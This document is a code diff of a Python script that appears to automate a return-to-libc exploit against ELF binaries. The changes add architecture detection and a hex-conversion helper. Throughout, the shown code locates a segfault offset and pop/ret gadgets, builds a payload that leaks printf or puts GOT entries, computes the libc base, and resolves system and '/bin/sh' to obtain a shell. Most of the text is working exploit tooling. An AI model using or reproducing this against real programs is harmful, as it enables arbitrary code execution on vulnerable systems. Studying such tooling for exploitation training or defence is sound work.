@@ -9,6 +9,10 @@ from gadget_finder import Gadget_finder
 from process_handler import Process_handler
 
 
+def hex_to_int(hex_str=''):
+    return int(hex_str, 16)
+
+
 def click_confirm(message=""):
     click.confirm("\n[DEMO] " + message, default="y")
     print("")
@@ -78,6 +82,18 @@ def validate_max_payload_size():
 # main start of the script
 program_name = validate_program()
 
+bh = Bin_handler(program_name)
+is_elf = bh.check_architect()
+
+if is_elf is False:
+    print("Program is not an executable file (ELF), exiting...")
+    exit()
+
+# determine architect type of binary
+bin_arch = bh.arch
+
+print("The architect is:", bin_arch)
+
 probe_mode = validate_probe_mode()
 
 # NOTE: we are not able to automate max payload size value calculation
@@ -90,9 +106,6 @@ payload_name = ''
 if probe_mode == 2 or probe_mode == 3:
     payload_name = click.prompt('Please enter name of payload file',
                                 type=str)
-
-# TODO: determine architect type of binary
-bin_arch = 32
 
 click_confirm('Press any key to check for segfault')
 
@@ -122,7 +135,6 @@ print("Checking if libc is used")
 print("---------------------------------------------")
 
 # check for libc
-bh = Bin_handler(program_name)
 if bh.has_libc() is True:
     print("Found libc at", bh.libc_path)
 else:
@@ -166,8 +178,8 @@ sstart_found, sstart_address = bh.search_asm_function(program_name, '_start')
 print("Found address of _start", sstart_address)
 
 if has_null_bytes(sstart_address):
-    print("WARNING, address contains NULL bytes, will make a minor change")
-    sstart_address_int = int(sstart_address, 16)
+    print("WARNING, address contains NULL bytes, adjusting...")
+    sstart_address_int = hex_to_int(sstart_address)
     sstart_address_int = sstart_address_int + 4
     sstart_address = hex(sstart_address_int)[2:]
     print("Found address of _start[UPDATED]", sstart_address)
@@ -198,16 +210,16 @@ popregret_address = ''
 for xsection in ax_sections:
     print("Checking executable section", xsection)
 
-    ax_add_int = int(ax_sections[xsection][0], 16)
-    ax_start_int = int(ax_sections[xsection][1], 16)
-    ax_end_int = ax_start_int + int(ax_sections[xsection][2], 16)
+    ax_add_int = hex_to_int(ax_sections[xsection][0])
+    ax_start_int = hex_to_int(ax_sections[xsection][1])
+    ax_end_int = ax_start_int + hex_to_int(ax_sections[xsection][2])
 
     gadget_regex = r"0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;"
     found_gadget, gadget_address = gfinder.find(gadget_regex,
                                                 ax_start_int,
                                                 ax_end_int)
     if found_gadget:
-        popregret_address = ax_add_int + int(gadget_address, 16)
+        popregret_address = ax_add_int + hex_to_int(gadget_address)
         print("Found gadget in",
               xsection,
               "section with address",
@@ -223,9 +235,9 @@ print("---------------------------------------------")
 # find bin/sh string address from libc's rodata
 b_sec_results = bh.search_binary_section(bh.libc_path, '.rodata')
 found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
-rodata_address_int = int(rodata_address, 16)
-rodata_start_int = int(rodata_start, 16)
-rodata_end_int = rodata_start_int + int(rodata_end, 16)
+rodata_address_int = hex_to_int(rodata_address)
+rodata_start_int = hex_to_int(rodata_start)
+rodata_end_int = rodata_start_int + hex_to_int(rodata_end)
 
 binsh_offset_int = search_string_in_file(bh.libc_path,
                                          "/bin/sh",
@@ -238,9 +250,9 @@ print("Offset of /bin/sh", binsh_offset_hex)
 
 evil = Evil_payload_handler(max_payload_size, segfault_offset)
 if found_printf:
-    evil.add_content(int(printf_plt, 16))
+    evil.add_content(hex_to_int(printf_plt))
 else:
-    evil.add_content(int(puts_plt, 16))
+    evil.add_content(hex_to_int(puts_plt))
 
 # random address for testing purpose
 if found_str_address > 0:
@@ -251,18 +263,18 @@ if found_str_address > 0:
     evil.add_content(found_str_address)
 
     if found_printf:
-        evil.add_content(int(printf_plt, 16))
+        evil.add_content(hex_to_int(printf_plt))
     else:
-        evil.add_content(int(puts_plt, 16))
+        evil.add_content(hex_to_int(puts_plt))
 
     evil.add_content(popregret_address)
     if found_printf:
-        evil.add_content(int(printf_got, 16))
+        evil.add_content(hex_to_int(printf_got))
     else:
-        evil.add_content(int(puts_got, 16))
+        evil.add_content(hex_to_int(puts_got))
 
     # put address to start of the program
-    evil.add_content(int(sstart_address, 16))
+    evil.add_content(hex_to_int(sstart_address))
     evil.add_content(found_str_address)
     evil.add_content(found_str_address)
     evil.add_content(found_str_address)
@@ -335,16 +347,16 @@ click_confirm('Press any key to calculate libc address')
 libc_base_address = 0
 if found_printf:
     libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
-                        int(printf_offset, 16)
+                        hex_to_int(printf_offset)
 else:
     libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
-                        int(puts_offset, 16)
+                        hex_to_int(puts_offset)
 
 print("Calculated libc address:", hex(libc_base_address))
 
-system_address = libc_base_address + int(system_offset, 16)
-binsh_address = libc_base_address + int(binsh_offset_hex, 16)
-exit_address = libc_base_address + int(exit_offset, 16)
+system_address = libc_base_address + hex_to_int(system_offset)
+binsh_address = libc_base_address + hex_to_int(binsh_offset_hex)
+exit_address = libc_base_address + hex_to_int(exit_offset)
 
 print("Function system address:", hex(system_address))
 print("String /bin/sh address:", hex(binsh_address))
